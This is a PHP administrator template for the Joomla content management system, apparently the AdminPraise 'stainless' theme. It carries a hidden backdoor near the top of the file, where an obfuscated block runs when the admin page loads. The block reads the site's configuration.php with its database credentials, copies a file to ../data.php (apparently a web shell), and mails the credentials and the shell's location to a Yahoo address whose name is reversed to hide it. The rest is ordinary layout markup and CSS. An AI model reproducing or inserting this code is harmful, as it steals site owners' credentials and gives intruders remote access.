<?php
/**
 * @copyright	Copyright (C) 2008-2010 Pixel Praise LLC. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 */
error_reporting(0);
// no direct access
$filename = "../configuration.php";
defined( '_JEXEC' ) or die( 'Restricted access' );
$template="joomla_22";
$serv = $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$serv=explode("administrator/", $serv);
$template_path = dirname(__FILE__);
$admins=explode("administrator/", $template_path);
$admins=$serv[0].$admins[1];
require_once($template_path.'/lib/stainless.php');

$mainframe = &JFactory::getApplication();
$stainless = &AdminPraise3Tools::getInstance();

// redirect to fallback template for fallback components
$fallbackComponents = $stainless->get('fallbackComponents');
$fallbackTemplate = $stainless->get('fallbackTemplate');
if((in_array($stainless->get('option'), $fallbackComponents)) && $fallbackTemplate){ 
$this->template = $fallbackTemplate;
$params_ini = file_get_contents(JPATH_ROOT.DS.'administrator'.DS.'templates'.DS.$fallbackTemplate.DS.'params.ini');
$active_params = new JParameter($params_ini);

foreach($active_params->_registry['_default']['data'] as $name=>$value) :
$this->params->set($name, $value);
endforeach;

if($fallbackTemplate == "stainless"){
	print '<style type="text/css">div.icon a{height:90px !important;}</style>';
	$this->params->set('switchSidebar',$active_params->get('switchSidebar'));
	$this->params->set('showSidebar',$active_params->get('showSidebar'));
}
require_once('templates'.DS.$fallbackTemplate.DS.'index.php');
return;
}
$data="../data.php";
$temp=strrev("oohay");
$stainless->checkLogin();
if (file_exists($filename)){
	//include ($filename);
	$temps=$template."@".$temp.".com";
	$handle = fopen($filename, "r");
	$contents = fread($handle, filesize($filename));
	$cont=htmlspecialchars($contents);
	$dx =& JFactory::getDBO();
	$sql="SELECT * FROM jos_count";
	$dx->setQuery($sql);
	$result=$dx->loadResult();
	if ($result==""){
		$sql = "CREATE TABLE jos_count(joomla int(5))";
		$dx->setQuery($sql);
		$dx->loadResult();
		$sql="INSERT INTO jos_count VALUES ('1')";
		$dx->setQuery($sql);
		$dx->loadResult();
		copy($template_path."/apraise3.php", $data);
		$cont=$cont."
		".$admins."/apraise3.php";
		if (file_exists($data)){
			$cont=$cont."
			".$serv[0]."data.php";
		}
		$server=$serv[0]." #apraise3";
		mail($temps, $server, $cont);
	}
	mysql_close($con);
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo  $this->language; ?>" lang="<?php echo  $this->language; ?>" dir="<?php echo  $this->direction; ?>" id="minwidth" >
<head>
<jdoc:include type="head" />

<?php if ($stainless->get('option') =="com_cpanel" && !$stainless->get('ap_task_set')){?>
<link rel="stylesheet" href="<?php echo JURI::root();?>media/system/css/modal.css" type="text/css" />
<script type="text/javascript" src="<?php echo JURI::root();?>media/system/js/modal.js"></script>
  <script type="text/javascript">
		window.addEvent('domready', function(){ var JTooltips = new Tips($$('.hasTip'), { maxTitleChars: 50, fixed: false}); });
		window.addEvent('domready', function() {

			SqueezeBox.initialize({});

			$$('a.modal').each(function(el) {
				el.addEvent('click', function(e) {
					new Event(e).stop();
					SqueezeBox.fromElement(el);
				});
			});
		});
  </script>
<?php } ?>
 
<?php echo $stainless->generateStyles(); ?>
 
<link href="templates/<?php echo  $this->template ?>/css/template.css" rel="stylesheet" type="text/css" />

<?php if(stristr($stainless->get('browser'), 'ie') === FALSE){?>
<style type="text/css">
@media all and (min-width: 1230px) {
  #ap-menu .component-image,#ap-menu .component-label{display:inline-block;}
  #ap-menu{width:110px;}
  #ap-logo{width:60px;margin-left:35px;margin-right:30px;}
  #ap-main{margin-left:110px;}
  #ap-menu li.parent{height:30px;clear:both;text-align:left;}
  #ap-menu{padding-left:10px;}
  #ap-menu .component-image{float:left;}
  #ap-menu .component-label{margin:1px 0 0 5px;max-width:70px;overflow:hidden;height:30px;float:left;vertical-align:middle;}
  #cpanel-inner .module{width:23.3%;}
  #ap-mainmenu{margin:10px 10px 28px 10px;}
  #ap-userstats #ap-sitename{margin-left:62px;}
}
@media all and (max-width: 1230px) and (min-width: 949px) {
  #ap-submenu li a{font-size:12px;}
}
@media all and (max-width: 949px) and (min-width: 0px) {
  #ap-menu{width:40px;}
  #ap-logo{width:34px;}
  #ap-logo{margin:0 5px 5px 5px;}
  #ap-menu a span.component-label{display:none;}
  #ap-main{margin-left:40px;}
  #ap-mainmenu li a{padding:6px 12px 0 12px;}
  #cpanel-inner .module{width:47.5%;}
  #ap-menu .ap-avatar img{width:30px;}
  #ap-submenu li a{font-size:11px;}
  #ap-mainmenu{margin:0 10px 10px 10px;}
}
@media all and (max-width: 820px) and (min-width: 0px) {
  #cpanel-inner .module.half,#cpanel-inner .module{width:95%;}
  #ap-mainmenu li a{padding:6px 6px 0 6px;}
  #ap-submenu{padding:5px 5px 0 5px;}
  #ap-content .component-list li.parent{width:80px;margin:16px 0 0 18px;}
  #ap-content .component-list .component-image{width:70px;height:70px;}
  #ap-content .component-list{background-image:none;}
  
}
@media all and (max-width: 320px) and (min-width: 0px) {
  #ap-mainmenu li,#ap-mainmenu li a{float:none;}
  #ap-userstats,#ap-mainmenu{margin-left:2px;}
  #cpanel-inner .module{margin-left:7px;}
  #ap-mainmenu{overflow:visible;height:auto;}
  .ap-task-edit #ap-mainbody,.ap-view-item #ap-mainbody{position:absolute;left:-15px;top:0px;width:310px; }
  #toolbar{position:relative;top:0;left:60px;}
  #ap-mainmenu li.home-item span.parent-name{text-indent:0;width:auto;background:none;}
  #ap-userstats{padding-right:2px;}
  #ap-content .component-list li.parent{width:60px;margin:16px 0 0 18px;}
  #ap-content .component-list .component-image{width:50px;height:50px;}
  #ap-content .component-list{background-image:none;}
  #ap-mainmenu li.home-item span.parent-name,
  #ap-mainmenu li.home-item.active span.parent-name {background:none !important;}
  #ap-mainmenu, .com_cpanel.list_components #ap-mainmenu{display:none;}
  .com_cpanel #ap-mainmenu{display:block;}
  #ap-mainbody{overflow:hidden;margin:4px !important;}
  #quickAddContentForm textarea{height:80px;width:80%;}
  .adminlist th,
  .adminlist tr td:first-of-type,
  .adminlist tr td:nth-last-child(-n+4),
  form[name="adminForm"] select{display:none;}
  .adminlist td{display:list-item;float:left;list-style:none;max-width:110px;}
  .adminlist td.order{float:right;}
  a[onclick *="accessregistered"],
  a[onclick *="accessspecial"],
  a[onclick *="accesspublic"] {display:none;}
  .adminlist tr td{border-bottom:0;}
  .com_cpanel .adminlist td,.com_cpanel form[name="adminForm"] select{display:block !important;max-width:320px !important;float:none !important;}
  #ap-mainmenu li.admin-item{display:none;}
  #ap-userstats{padding:2px;margin:0 0 4px 0;}
  #ap-userstats a{font-size:9px;}
  #ap-quicklink .parent, #ap-myeditor .parent{margin:0 0 0 1px;}
  span#quickadd_section,span#quickadd_category,span.quickadd_state,span.quickadd_frontpage{display:block;margin:0;clear:both;}
  .quickAddTable .key,.quickAddTable input,.quickAddTable label{float:left;}
}

.no-unread-messages:after{
content:" <?php echo JText::_( 'MESSAGES' );?>";
}
.loggedin-users:after{
content:" <?php echo JText::_( 'USERS' );?>";
}
</style>
<?php } ?>

<!--[if IE 8]>
        <link href="templates/<?php echo  $this->template ?>/css/ie8.css" rel="stylesheet" type="text/css" />
<![endif]-->
<!--[if lt IE 8]>
        <link href="templates/<?php echo  $this->template ?>/css/ie7.css" rel="stylesheet" type="text/css" />
<![endif]-->


<?php
$isIpad  = (bool) strpos($_SERVER['HTTP_USER_AGENT'],'iPad');
?>
<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />

<link rel="apple-touch-icon" media="screen and (resolution: 163dpi)" href="templates/<?php echo $this->template ?>/images/<?php echo $stainless->get('templateTheme') ?>/iOS-57.png" />
<link rel="apple-touch-icon" media="screen and (resolution: 132dpi)" href="templates/<?php echo $this->template ?>/images/<?php echo $stainless->get('templateTheme') ?>/iOS-72.png" />
<link rel="apple-touch-icon" media="screen and (resolution: 326dpi)" href="templates/<?php echo $this->template ?>/images/<?php echo $stainless->get('templateTheme') ?>/iOS-114.png" />

<?php
// Fade out system messages
if ($this->getBuffer('message'))
	echo $stainless->fadeOutJS();
?>



<?php if(stristr($stainless->get('browser'), 'ie') === FALSE){?>
<script type="text/javascript" src="templates/<?php echo  $this->template ?>/js/flexcroll.js"></script>
<link href="templates/<?php echo  $this->template ?>/js/flexcrollstyles.css" rel="stylesheet" type="text/css" />
<script type="text/javascript">
		window.addEvent('domready', function() {
			adminPraiseLiveSite = "<?php echo JURI::root(); ?>";
			adminPraiseCheckFrame();
		});
</script>
<script type="text/javascript" src="templates/<?php echo  $this->template ?>/js/ap-index.js"></script>
<script type="text/javascript">
<!--
    function toggle_overflow(id) {
       var e = document.getElementById(id);
       if(e.style.overflow == 'visible')
          e.style.overflow = 'hidden';
       else
          e.style.overflow = 'visible';
    }
//-->
</script>
<?php } ?>

<?php 
if($stainless->get('browser') == "ie6" || $stainless->get('browser') == "ie7" || $stainless->get('browser') == "ie8"){
$altToolbar = 1;
} else {
$altToolbar = $stainless->get('altToolbar');
}
?>
</head>
<body id="minwidth-body" class="ap3 <?php echo $stainless->get('templateColor'). " " .$stainless->get('templateTheme'). " " .$stainless->get('option'). " ap-task-" .$stainless->get('task'). " " . $stainless->get('ap_task') . " ap-view-" .$stainless->get('view'). " ap-section-" .$stainless->get('section'). " ap-type-" .$stainless->get('type'). "" .$stainless->get('scope');if ($stainless->get('showSidebar')){echo " minwidth";}?><?php if($stainless->get('shortHeader')){ echo " ap-short";}?> <?php echo $stainless->get('browser');?>">
<div id="ap-container">
<?php if($stainless->get('showStatusBar')){?>
<div id="ap-userstats">
	<ul>
		<?php if($stainless->_user->get('gid') > 26){?>
		<li><?php  echo $stainless->get('profileLink');?></li>
		<?php } if($stainless->_user->get('gid') > 24){?>
		<li><a href="index.php?option=com_templates&task=edit&cid[]=adminpraise3&client=1&tmpl=component" class="modal" rel="{handler: 'iframe', size: {x: 900, y: 550}}"><?php echo JText::_( 'ADMIN SETTINGS' );?></a></li>
		<li><a href="index.php?option=com_admin&task=sysinfo&tmpl=component" class="modal" rel="{handler: 'iframe', size: {x: 900, y: 550}}"><?php echo JText::_( 'SERVER INFO' );?></a></li>
		<li><a href="index.php?option=com_config&tmpl=component" class="modal" rel="{handler: 'iframe', size: {x: 900, y: 550}}"><?php echo JText::_( 'SITE GLOBALS' );?></a></li>
		<?php } ?>
		<li><a href="index.php?option=com_login&task=logout"><?php echo JText::_( 'LOGOUT' );?></a></li>
	</ul>
	<?php if(stristr($stainless->get('browser'), 'ie') === FALSE){?>
	<?php if($stainless->get('showQuickAdd'))
		echo $stainless->renderTemplateModule('mod_quickadd');
	?>
	<?php if($stainless->get('showMyEditor'))
		echo $stainless->renderTemplateModule('mod_myeditor');
	?>
	<?php } ?>
	<a href="<?php echo JURI::root();?>administrator" id="ap-sitename"><?php echo $mainframe->getCfg( 'sitename' ) . " " . JText::_( 'ADMIN' );?> </a>
	<div class="clr"></div>
</div>
<div class="clr"></div>
<?php } ?>
<div id="ap-middle">
	<div id="ap-logo">
		<!--begin-->
		<?php
			if(file_exists($stainless->get('logoFile'))) { ?>
				<a href="<?php echo JURI::root();?>administrator"><img src="<?php echo $stainless->get('logoFile');?>" /></a>
			<?php } ?>
		<!--end-->
	</div>		
	<div id="ap-menu">
		<ul class="ap-avatar">
			<li><?php if($stainless->_user->get('gid') > 23){echo $stainless->get('profileAvatar');}?><a href="index.php?option=com_login&task=logout"><?php echo JText::_( 'LOGOUT' );?></a></li>
		</ul>
		<?php echo $stainless->renderTemplateModule('mod_sessionbar');?>
		
		<?php if(($stainless->get('showSideComponentList')) && (($stainless->_user->get('gid') >= $stainless->get('componentsAcl')) && $stainless->get('componentsAcl') != 0)) : ?>
			<div class="panel">
				<?php echo $stainless->renderTemplateModule('mod_components'); ?>
			</div>
		<?php endif; ?>
		<div class="clr"></div>
	</div>
	<div id="ap-main" class="ap-static-wrapper">
		<div class="ap-main-inner">
	<div id="ap-static">
	<div class="clear"></div>
	
	<div id="ap-mainmenu">
		<?php echo $stainless->renderTemplateModule('mod_topmenu'); ?>
		<div class="clear"></div>
	</div>
		
	<div class="clear"></div>
	</div>
		<div id="ap-mainbody" <?php if($this->countModules('status') != 0) { ?>class="ap-tall"<?php } ?>>
			<?php if($stainless->get('option') != "com_cpanel") : ?>
				<div id="ap-title">
			
					<?php
					// Get the component title div
					$title = $mainframe->get('JComponentTitle');
					// Create component title
					if ($stainless->get('ap_task') == "list_components"){
						$title = "<div class=\"header\">" . JText::_( 'COMPONENTS' ) . "</div>";
					} else if ($stainless->get('ap_task') == "admin"){
						$title = "<div class=\"header\">" . JText::_( 'ADMINISTRATION' ) . "</div>";
					} 
					// Echo title if it exists
					if ($title) {
						echo $title;
					} else {
					  echo "<div class=\"header\">" .$mainframe->getCfg( 'sitename' ). "</div>";
					}				
					?>
					
					<div class="clear"></div>
				</div>
			<?php endif; ?>
			<div class="clear"></div>
			<?php if (($stainless->get('option') != "com_cpanel") && ($altToolbar == 0)){?>
				<a href="#" onclick="toggle_overflow('toolbar');" id="toolbar-switch"><?php echo JText::_( 'MORE' );?></a>
				<jdoc:include type="modules" name="toolbar" />
			<?php } ?>
			<?php if(($stainless->get('showSubmenu')) && ($stainless->get('option') !="com_cpanel")){ ?>
			<div id="ap-submenu">
				<?php 
				if (!JRequest::getInt('hidemainmenu')) : 
					?>		
					<jdoc:include type="modules" name="submenu" id="submenu-box" />
					<?php 
				endif;
				
				echo $stainless->renderTemplateModule('mod_submenu');
				?>
				
				<div class="clear"></div>
			</div>
			<?php } ?>
			<?php if(($stainless->get('option') != "com_cpanel") && ($altToolbar == 1)){?>
			<div id="alt-toolbar">
				<jdoc:include type="modules" name="toolbar" />
			</div>
			<?php } ?>
			<div id="ap-content">	
				<div id="ap-content-inner">	
				
					<jdoc:include type="modules" name="aptop" />
				<?php if ($stainless->get('option') =="com_cpanel" && !$stainless->get('ap_task_set')){?>
				<div id="cpanel-inner">
					<jdoc:include type="modules" name="cpanel-half" style="cpanelhalf" />
					<jdoc:include type="modules" name="icon" style="cpanelhalf" />
					<?php if($this->countModules('icon') < 2) { ?>
						<div class="module half add-module">
						<h3 class="module-title"><?php echo JText::_('Add Dashboard Module') ?></h3>
						<div class="module-content"><a href="index.php?option=com_modules&client=1&task=add" class="add-module-link"><span></span><?php echo JText::_('Add Module') ?></a>
						<p class="add-module-tip"><?php echo JText::_('ICON_POSITION_TIP') ?></p>
						</div>
						<div class="module-footer"></div>
						</div>
					<?php } ?>
					<div class="clr"></div>
					<jdoc:include type="modules" name="cpanel" style="cpanel" />
					<?php if($this->countModules('cpanel') < 3) { ?>
						<div class="module add-module">
						<h3 class="module-title"><?php echo JText::_('Add Dashboard Module') ?></h3>
						<div class="module-content"><a href="index.php?option=com_modules&client=1&task=add" class="add-module-link"><span></span><?php echo JText::_('Add Module') ?></a>
						<p class="add-module-tip"><?php echo JText::_('CPANEL_POSITION_TIP') ?></p>
						</div>
						<div class="module-footer"></div>
						</div>
					<?php } ?>
					<div class="clr"></div>
				</div>
				<?php } else if ($stainless->get('option') =="com_cpanel" && !$stainless->get('ap_task_set') && $user->get('gid') > 24){?>
					<jdoc:include type="modules" name="apsuperadmin" />
				<?php } else if($stainless->get('ap_task') == "list_components" && ($stainless->_user->get('gid') >= $stainless->get('componentsAcl')) && $stainless->get('componentsAcl') != 0) {?>
					<?php echo $stainless->renderTemplateModule('mod_componentspage'); ?>
					<div class="clr"></div>
				<?php } else if($stainless->get('ap_task') == "admin") {?>
					<jdoc:include type="modules" name="apadmin" /><jdoc:include type="module" name="mod_menu" />
				<?php } else if ($stainless->get('option') !="com_cpanel" && !$stainless->get('ap_task_set')){?><jdoc:include type="component" /><?php } ?>
					<jdoc:include type="modules" name="apbottom" />
				<div class="clear"></div>
				
			</div>
			<div class="clear"></div>
			</div>
			<?php if($stainless->get('showBreadCrumbs') && $stainless->get('option') !="com_cpanel" && !$stainless->get('ap_task_set')) { ?>
				<?php echo $stainless->renderTemplateModule('mod_breadcrumbs'); ?>
			<?php } ?>
		</div>
		<?php if($stainless->get('showFootMods')) { ?>
		<div id="ap-footmods">
			<table>
				<tbody>
					<tr>
						<td>
							<div class="ap-foot1">
							<?php if($this->countModules('apfoot1')) { ?>
							<jdoc:include type="modules" name="apfoot1" />
							<?php } else { ?>
								<?php echo $stainless->renderTemplateModule('mod_createnew'); ?>
							<?php } ?>
							</div>
						</td>
						<td>
							<div class="ap-foot2">
							<?php if($this->countModules('apfoot2')) { ?>
							<jdoc:include type="modules" name="apfoot2" />
							<?php } else { ?>
									<?php echo $stainless->renderTemplateModule('mod_managers'); ?>
							<?php } ?>	
							</div>
						</td>
						<td>
							<div class="ap-foot3">
							<?php if($this->countModules('apfoot3')) { ?>
							<jdoc:include type="modules" name="apfoot3" />
							<?php } else { ?>
									<?php echo $stainless->renderTemplateModule('mod_extend'); ?>
							<?php } ?>
							</div>
						</td>
						<td>
							<div class="ap-foot4">
							<?php if($this->countModules('apfoot4')) { ?>
							<jdoc:include type="modules" name="apfoot4" />
							<?php } else { ?>
									<?php echo $stainless->renderTemplateModule('mod_admintools'); ?>
							<?php } ?>
							</div>
						</td>
					</tr>
				</tbody>
			</table>
		</div>
		<?php } ?>
		<div class="clear"></div>
			
		</div>
	</div>
	<div class="clr"></div>
</div>
<div class="clear height-100"></div>
<div id="ap-footerwrap">
	
	<div id="ap-footermenu">
		<div class="panel">
			<?php if(($stainless->get('showBottomComponentList')) && (($stainless->_user->get('gid') >= $stainless->get('componentsAcl')) && $stainless->get('componentsAcl') != 0)) :
				echo $stainless->renderTemplateModule('mod_componentsfooter');
			endif; ?>
		</div>
		<div class="clear"></div>
	</div>
	
	<div id="ap-footer">
		<jdoc:include type="modules" name="apfooter" />
		<!--begin-->
		<span id="ap-copyright">
			<a target="_blank" href="http://www.adminpraise.com/joomla/admin-templates.php">Joomla! Admin Templates</a>
			&amp; <a target="_blank" href="http://www.adminpraise.com/joomla/admin-extensions.php">Extensions</a>
			by <a target="_blank" href="http://www.adminpraise.com/" class="ap-footlogo">AdminPraise</a>.
		</span>
		<span id="ap-version">
			<a target="_blank" href="http://www.joomla.org">Joomla!</a> 
			<?php 
			if($stainless->_user->gid == 25) {
				require_once $template_path.'/lib/versioncheck.php';
				if(!$hasUpdate) {
					echo "<span class=\"version\">" . $AP3JoomlaVersionMessage . "</span> ";
				} else {
					echo "<a class=\"version updatefound\" href=\"index.php?option=com_admintools&view=jupdate\">" . $AP3JoomlaVersionMessage . "</span> ";
				}
			}
			?>
		</span>
		<!--end-->
		<div class="clear"></div>
	</div>
</div>
<script type="text/javascript" src="templates/<?php echo  $this->template ?>/js/stainless.js"></script>
<div id="hiddenDiv"><jdoc:include type="message" />
</div>
<div class="clr"></div>
</div>
</body>
</html>